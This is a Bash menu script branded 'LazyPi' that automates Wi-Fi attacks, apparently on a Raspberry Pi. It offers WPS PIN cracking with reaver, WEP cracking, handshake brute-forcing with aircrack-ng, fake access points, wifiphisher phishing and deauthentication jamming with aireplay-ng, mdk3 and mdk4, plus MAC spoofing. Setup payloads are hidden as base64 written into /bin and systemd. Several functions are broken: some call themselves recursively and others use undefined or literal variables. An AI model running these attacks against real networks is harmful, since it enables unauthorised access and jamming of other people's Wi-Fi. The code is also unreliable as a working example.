#!/bin/bash


clear

function tools_check(){
clear
echo "Checking Missing Tools....!"

packages=("golang" "php" "reaver" "wifite" "aircrack-ng" "mdk3" "mdk4" "wifipumpkin3" "rtlsdr-scanner" "bettercap" "bully" "nmap" "apache2" "mitmproxy" "gr-gsm" "htop")
missing_packages=()

for package in "${packages[@]}"
do
    if ! dpkg -s "$package" >/dev/null 2>&1; then
        missing_packages+=("$package")
    fi
done

if [ ${#missing_packages[@]} -gt 0 ]; then
    echo -e "The following packages are missing: ${missing_packages[@]}"
    read -p "Do you want to install all missing packages? (y/n) " -n 1 -r
    echo -e
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        sudo apt-get update
        sudo apt-get install "${missing_packages[@]}"
    fi
else
    echo -e "All packages are already installed."
fi

clear

}


function hotsport_only() {
  clear
  echo -e "***Hotspot Setup***\n"
  read -p "Set hotspot name: " ssid_name
  read -p "Set hotspot password: " password
  echo -e "\n"
  # Show list of available WiFi interfaces with numbers
  echo -e "\e[32m[\e[31m+\e[32m] \e[32mSet WiFi interface name \e[32m[\e[31m+\e[32m]\e[32m[\e[31m+\e[37m]"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}
  nmcli con add type wifi ifname $interface_name con-name $ssid_name autoconnect yes ssid $ssid_name
  nmcli con modify $ssid_name 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
  nmcli con modify $ssid_name wifi-sec.key-mgmt wpa-psk
  nmcli con modify $ssid_name wifi-sec.psk "$password"
  nmcli con up $ssid_name ifname $interface_name
  echo -e "\n\033[0;32mHotspot Create Successfullt***\n\033[0m"
  sleep 2
}

function delete_hotsport(){

  clear
  read -p "Hotspot name: " ssid_name
  nmcli connection delete $ssid_name

}


function show_networks(){

  clear
  nmcli connection show
  sleep 1d

}

hostname_change() {
    clear
    # Prompt the user for the new hostname
    read -p "Enter the new hostname: " new_hostname

    # Check if the new hostname is provided
    if [[ -z "$new_hostname" ]]; then
        echo "Error: No hostname provided. Exiting."
        exit 1
    fi

    # Change the current hostname
    echo "Changing hostname to '$new_hostname'..."
    sudo hostnamectl set-hostname "$new_hostname"

    # Update /etc/hostname file
    echo "$new_hostname" | sudo tee /etc/hostname > /dev/null

    # Update /etc/hosts file
    sudo sed -i "s/^\(127\.0\.1\.1\s*\).*/\1$new_hostname/" /etc/hosts

    echo "Hostname has been changed to '$new_hostname' and made permanent."
}

function hotsport_ssh() {
  echo -e "***Hotspot Setup***\n"
  read -p "Set hotspot name: " ssid_name
  read -p "Set hotspot password: " password
  echo -e "\n"
  # Show list of available WiFi interfaces with numbers
  echo -e "\e[32m[\e[31m+\e[32m] \e[32mSet WiFi interface name \e[32m[\e[31m+\e[32m]\e[32m[\e[31m+\e[37m]"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}
  service ssh start
  systemctl enable ssh
  echo -e "\n\033[0;32m***SSH Autostartup Setup Successfull***\033[0m\n"
  nmcli con add type wifi ifname $interface_name con-name $ssid_name autoconnect yes ssid $ssid_name
  nmcli con modify $ssid_name 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
  nmcli con modify $ssid_name wifi-sec.key-mgmt wpa-psk
  nmcli con modify $ssid_name wifi-sec.psk "$password"
  nmcli con up $ssid_name ifname $interface_name
  echo -e "\n\033[0;32mHotspot Create Successfullt***\n\033[0m"
  sleep 2
}

function rpi() {

  # Define the network configuration for usb0
  config="
  allow-hotplug usb0
  iface usb0 inet static
     address 192.168.7.2
     netmask 255.255.255.0
     network 192.168.7.0
     broadcast 192.168.7.255
     gateway 192.168.7.1
  "

  # Check if the configuration already exists
  if grep -q "allow-hotplug usb0" /etc/network/interfaces; then
      echo "Configuration for usb0 already exists."
  else
      # Append the configuration to the /etc/network/interfaces file
      echo "$config" | sudo tee -a /etc/network/interfaces
      echo "IyEvYmluL2Jhc2gKCiMgRGVmaW5lIHRoZSBmaWxlIHBhdGgKRklMRT0iL2V0Yy9yZXNvbHYuY29uZiIKCiMgUmVhZCB0aGUgZmlsZSwgcmVtb3ZlIGxpbmVzIGNvbnRhaW5pbmcgdGhlIHNwZWNpZmllZCBzdHJpbmdzLCBhbmQgcHJpbnQgb25seSB0aGUgSVAgYWRkcmVzcwppcD0kKGdyZXAgLW9QICcoPzw9bmFtZXNlcnZlclxzKShbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfScgIiRGSUxFIikKCnN1ZG8gcm91dGUgYWRkIGRlZmF1bHQgZ3cgJGlwIHdsYW4wCgpzdWRvIGlwdGFibGVzIC10IG5hdCAtQSBQT1NUUk9VVElORyAtbyB3bGFuMCAtaiBNQVNRVUVSQURFCnN1ZG8gaXB0YWJsZXMgLUEgRk9SV0FSRCAtaSB3bGFuMCAtbyB1c2IwIC1tIHN0YXRlIC0tc3RhdGUgUkVMQVRFRCxFU1RBQkxJU0hFRCAtaiBBQ0NFUFQKc3VkbyBpcHRhYmxlcyAtQSBGT1JXQVJEIC1pIHVzYjAgLW8gd2xhbjAgLWogQUNDRVBUCg==" | base64 -d | tee /bin/netup
      chmod +x /bin/netup
      echo "W1VuaXRdCkRlc2NyaXB0aW9uPU5ldHVwIFNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpFeGVjU3RhcnQ9bmV0dXAKUmVzdGFydD1vbi1mYWlsdXJlCkV4ZWNTdG9wPS9iaW4va2lsbCAkTUFJTlBJRAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cgo=" | base64 -d | tee /usr/lib/systemd/system/netup.service
      systemctl start netup
      systemctl enable netup
      echo "Configuration for usb0 has been added"
  fi


  sudo systemctl enable avahi-daemon
  sudo systemctl start avahi-daemon

  echo "sudo iw phy phy0 interface add mon0 type monitor" >> /bin/mon0
  echo "sudo ip link set mon0 up" >> /bin/mon0
  chmod +x /bin/mon0
  echo "mon0 Configuration Successfull"

  apt update
  apt install hcxtools -y
}

function wifi_network() {
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "\e[32m[\e[31m+\e[32m] \e[32mSet WiFi interface name \e[32m[\e[31m+\e[32m]\e[32m[\e[31m+\e[37m]"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}
  # Get available Wi-Fi networks
  wifi_list=$(nmcli -t -f SSID dev wifi)

  # Display the numbered list of Wi-Fi networks
  echo -e "\nAvailable Wi-Fi networks:"
  IFS=$'\n' read -rd '' -a networks <<< "$wifi_list"
  for i in "${!networks[@]}"; do
    echo "$((i+1))) ${networks[i]}"
  done

  # Prompt the user to choose a Wi-Fi network
  echo -n -e "\nSelect Wifi Network: "
  read selection

  # Validate user input
  if [[ "$selection" =~ ^[0-9]+$ ]]; then
    if ((selection >= 1 && selection <= ${#networks[@]})); then
      chosen_network="${networks[selection-1]}"
      clear
      read -p "Enter Wifi Password: " password
      sudo nmcli dev wifi connect "$chosen_network" password $password ifname $interface_name
      sleep 3
    else
      echo "Invalid selection. Please enter a number within the range."
      sleep 2
    fi
  else
    echo "Invalid input. Please enter a number."
    sleep 2
  fi
}

function change_mac_address() {
  # Ask user to input new MAC address
  read -p "Enter a new MAC address or leave empty for random address: " new_mac
  clear

  # Generate random MAC address if user input is empty
  if [ -z "$new_mac" ]; then
    macchanger -r
    clear
  else
    # Change MAC address to user input
    macchanger -m "$new_mac"
    clear
  fi

  # Show list of available wireless interfaces
  clear
  echo -e "Available interfaces:"
  interfaces=$(ls /sys/class/net | grep -E '^(wlan|en|wlx)')
  count=1
  for interface in $interfaces; do
    echo -e "$count) $interface"
    ((count++))
  done

  # Ask user to select interface and set it
  read -p "Enter the number of the interface you want to set: " interface_number
  selected_interface=$(echo -e "$interfaces" | sed "${interface_number}q;d")
  if [ -n "$selected_interface" ]; then
    clear
    sudo ip link set "$selected_interface" down
    sudo macchanger -r "$selected_interface"
    sudo ip link set "$selected_interface" up
    echo -e "MAC address for $selected_interface has been changed."
    sleep 1
  else
    clear
    echo -e "Invalid interface number entered."
    sleep 1
  fi
}


function restore_mac_address() {
  # Get a list of wifi interfaces and their corresponding numbers
  interfaces=$(ls /sys/class/net | grep -E '^(wlan|en|wlx)')
  echo -e "Select a wifi interface to restore its original MAC address:"

  # Display the available interfaces with a corresponding number
  select interface in $interfaces; do
    # Check if the input is valid
    if [[ -n $interface ]]; then
      # Use macchanger to restore the original MAC address of the selected interface
      sudo ifconfig $interface down
      sudo macchanger -p $interface
      sudo ifconfig $interface up
      echo -e "MAC address for $interface has been restored."
      sleep 1
      break
    else
      echo -e "Invalid option. Please select a number from the list."
      sleep 1
    fi
  done
}


function ip_change() {
  clear
  # Ask user to input IP address
  read -p "Enter IP address: " ip_address

  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  # Set IP address for selected interface
  sudo ifconfig $interface_name $ip_address
  echo -e -n "New IP: $ip_address for $interface_name"
  sleep 1
}

function restore_ip_change() {
  clear
  # Ask user to input IP address
  read -p "Original IP address: " ip_address

  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  # Set IP address for selected interface
  sudo ifconfig $interface_name $ip_address
  echo -e -n "Restore IP: $ip_address for $interface_name"
  sleep 1
}


#WIFI PWNED

function start_monitor_mode() {
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  # Set IP address for selected interface
  airmon-ng start $interface_name
  sleep 1
}

function stop_monitor_mode() {
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  # Set IP address for selected interface
  airmon-ng stop $interface_name
  sleep 1
}

function wifite(){
  clear
  wifite
  sleep 10
}

function wifitewep(){
  clear
  wifite --wep
  sleep 10
}

function wifitewps(){
  clear
  wifite --wps
  sleep 20
}

function wifiphisher() {
  wifiphisher
}

function aponly() {
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  #ap name
  read -p "AP Name#> " apname

  airbase-ng -e "$apname" -c 10 $interface_name
}

function wepcrack() {
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  #ap name
  read -p "BSSID#> " bssid
  read -p "Channel Number#> " channel

  besside-ng $interface_name -c $channel -b $bssid
  aircrack-ng wep.cap
}

function airodump(){
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  # Set IP address for selected interface
  airodump-ng $interface_name
}

function wash(){
  clear
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  
  if [ ${#interfaces[@]} -eq 0 ]; then
    echo "No WiFi interfaces found."
    return 1
  fi
  
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  
  # Validate user input
  if ! [[ "$interface_number" =~ ^[0-9]+$ ]] || [ "$interface_number" -lt 1 ] || [ "$interface_number" -gt ${#interfaces[@]} ]; then
    echo "Invalid selection. Please enter a valid number."
    return 1
  fi
  
  interface_name=${interfaces[$(($interface_number-1))]}

  clear
  # Run the wash command with the selected interface
  sudo wash -i $interface_name
}



function reaver() {
  # Function to print available Wi-Fi networks
  print_networks() {
    rm -rf /tmp/airodump-ng-01.csv
    clear
    airodump-ng $interface_name --output-format csv -w /tmp/airodump-ng &
    sleep 60
    kill $!
    clear
    echo -e "Option |  BSSID |  Channel  | Network Name"
    echo -e "------------------------------------------"
    cat /tmp/airodump-ng-01.csv | awk -F "," '{if(length($14)>0){print NR-1")",$1,$4,$14} }' | tail -n+2 | sort -k4 -rn
  }

  # Function to run airodump-ng
  run_airodump() {
    bssid=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $1}}')
    ch=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $4}}')
    essid=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $14}}')
    # Run the reaver command
    reaver_output=$(reaver -i $interface_name -c 6 -b $bssid -vv -K -L -N -d 15 -T .5 -r 3:15)
    # Check if "WPS PSK" text exists in the output
    if echo -e "$reaver_output" | grep -q "WPS PSK"; then
        echo -e "Wifi Hacked Successfully :"
        echo -e "$reaver_output" | grep "WPS PSK"
        sleep 60
    else
        echo -e "WiFi Not Hacked"
        sleep 2
    fi
  }

  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  while true; do
    print_networks
    echo -e ""
    read -p "Choose the number (0 to rescan, Q to quit): " option
    

    case $option in
      Q|q) exit ;;
      0) continue ;;
      *)
        if [[ $option =~ ^[0-9]+$ ]]; then
          run_airodump
        else
          echo -e "Invalid option, please try again."
        fi
        ;;
    esac
  done
}

function handshake_brute(){
  echo -e "Password Wordlist#>"
  read wordlist
  echo -e "Handshake File#>"
  read handshake
  aircrack-ng $handshake -w $wordlist
}

function wifi_jamming() {
  clear
  echo "1) AIR-Replay"
  echo "2) MDK3"
  echo "2) MDK4"
  read -p "Enter your choice: " choice
  

  if [ "$choice" = "1" ]; then
      # Show list of available WiFi interfaces with numbers
      echo -e "Available WiFi interfaces:"
      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
      for i in "${!interfaces[@]}"; do
        echo -e "$(($i+1))) ${interfaces[$i]}"
      done

      # Ask user to select interface by number
      read -p "Enter number of interface to use: " interface_number
      interface_name=${interfaces[$(($interface_number-1))]}
      read -p "BSSID#> " bssid
      
      reaver_output=$(aireplay-ng -0 0 -a $bssid $interface_name)
      
  elif [ "$choice" = "2" ]; then
      # Show list of available WiFi interfaces with numbers
      echo -e "Available WiFi interfaces:"
      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
      for i in "${!interfaces[@]}"; do
        echo -e "$(($i+1))) ${interfaces[$i]}"
      done

      # Ask user to select interface by number
      read -p "Enter number of interface to use: " interface_number
      interface_name=${interfaces[$(($interface_number-1))]}
      read -p "Channel Number#> " channel
      echo -e "Wifi Jamming Was Started......"
      mdk3 $interface_name d -c $ch
     
  elif [ "$choice" = "3" ]; then
      # Show list of available WiFi interfaces with numbers
      echo -e "Available WiFi interfaces:"
      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
      for i in "${!interfaces[@]}"; do
        echo -e "$(($i+1))) ${interfaces[$i]}"
      done

      # Ask user to select interface by number
      read -p "Enter number of interface to use: " interface_number
      interface_name=${interfaces[$(($interface_number-1))]}

      echo -e "Wifi Jamming Was Started......"
      mdk4 $interface_name d -c $ch
     
  else
      echo "Invalid choice. Please enter a valid option."
  fi
}

function wpspincrack(){
  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  read -p "BSSID#> " bssid
  read -p "WPS PIN#> " wpspin

  reaver -i $interface_name -b BSSID -p $wpspin -vv
}

function wifipumpkin_tool(){
  wp3
}

function monitorclient(){

  # Show list of available WiFi interfaces with numbers
  echo -e "Available WiFi interfaces:"
  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
  for i in "${!interfaces[@]}"; do
    echo -e "$(($i+1))) ${interfaces[$i]}"
  done

  # Ask user to select interface by number
  read -p "Enter number of interface to use: " interface_number
  interface_name=${interfaces[$(($interface_number-1))]}

  read -p "BSSID#> " bssid
  airodump-ng $interface_name -d $bssid
}

while true
do
    # Display the menu options
    clear
    echo -e "\n\e[0;32m    ██╗      █████╗ ███████╗██╗   ██╗\e[0;38;5;128m██████╗ ██╗ \e[0;37mv3.0"
    echo -e "\e[0;32m    ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝\e[0;38;5;128m██╔══██╗██║"
    echo -e "\e[0;32m    ██║     ███████║  ███╔╝  ╚████╔╝ \e[0;38;5;128m██████╔╝██║  \e[0;37mBy \e[0;31m#Nahid0x1"
    echo -e "\e[0;32m    ██║     ██╔══██║ ███╔╝    ╚██╔╝  \e[0;38;5;128m██╔═══╝ ██║"
    echo -e "\e[0;32m    ███████╗██║  ██║███████╗   ██║   \e[0;38;5;128m██║     ██║"
    echo -e "\e[0;31mThe\e[0;32m ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   \e[0;38;5;128m╚═╝     ╚═╝ \e[0;31m#a_automation script"
    echo -e "\n\033[0;36m*********************************************************************"
    echo -e "\e[33mSelect an option:\n\e[32m"
    echo -e ""
    echo -e "\e[33m*Requirement*"
    echo -e "\e[33m0\e[32m) Create Hotspot & Enable SSH    \e[31m| \e[33m00\e[32m) Connect WiFi Network"
    echo -e "\e[33mc\e[32m) Create Hotspot Only            \e[31m| \e[33mshow\e[32m) Show Networks"
    echo -e "\e[33md\e[32m) Remove Hotsport                \e[31m| \e[33mrpi\e[32m) RPI Zero 2 W Configure"
    echo -e "\e[33mcheck\e[32m) Check Tools                \e[31m| \e[33mhost\e[32m) Hostname Change"
    echo -e ""
    echo -e "\e[33m*Hardware*"
    echo -e "\e[33m01\e[37m) Change Mac-Address            \e[31m| \e[33m03\e[37m) Change Private IP Address"
    echo -e "\e[33m02\e[37m) Restore Original Mac-Address  \e[31m| \e[33m04\e[37m) Restore IP Address"
    echo -e ""
    echo -e "\e[33m*WIFI Hacking*"
    echo -e "\e[33m05\e[37m) START Monitor Mode            \e[31m| \e[33m17\e[37m) Monitor Wifi Clients"
    echo -e "\e[33m06\e[37m) STOP Monitor Mode             \e[31m| \e[33m18\e[37m) WPS Pin Crack [Reaver]"
    echo -e "\e[33m07\e[37m) Wifite                        \e[31m| \e[33m19\e[37m) Wifi-Pumpkin3"
    echo -e "\e[33m08\e[37m) WEP Hunt Only [Wifite]        \e[31m| \e[33m20\e[37m) Wifi-Phisher"
    echo -e "\e[33m09\e[37m) WPS Hunt Only [Wifite]"
    echo -e "\e[33m10\e[37m) Fake AP Only"
    echo -e "\e[33m11\e[37m) WEP Crack"
    echo -e "\e[33m12\e[37m) Monitoring Signal [Airodump]"
    echo -e "\e[33m13\e[37m) Dump Signal [WASH]"
    echo -e "\e[33m14\e[37m) WPS Crack [Reaver]"
    echo -e "\e[33m15\e[37m) Handshake Brute [Aircrack]"
    echo -e "\e[33m16\e[37m) WIFI Deauth"
    echo -e ""
    # Read the user's input
    read -p "[$USER@$HOSTNAME]~ ❯ " option
    case $option in
      0) hotsport_ssh;;
      00) wifi_network;;
      c) hotsport_only;;
      d) delete_hotsport;;
      show) show_networks;;
      check) tools_check;;
      rpi) rpi;;
      host) hostname_change;;
      1) change_mac_address;;
      2) restore_mac_address;;
      3) ip_change;;
      4) restore_ip_change;;
      5) start_monitor_mode;;
      6) stop_monitor_mode;;
      7) wifite;;
      8) wifitewep;;
      9) wifitewps;;
      10) aponly;;
      11) wepcrack;;
      12) airodump;;
      13) wash;;
      14) reaver;;
      15) handshake_brute;;
      16) wifi_jamming;;
      17) monitorclient;;
      18) wpspincrack;;
      19) wifipumpkin_tool;;
      20) wifiphisher;;
      *) echo -e "Invalid option!!";;
    esac
done
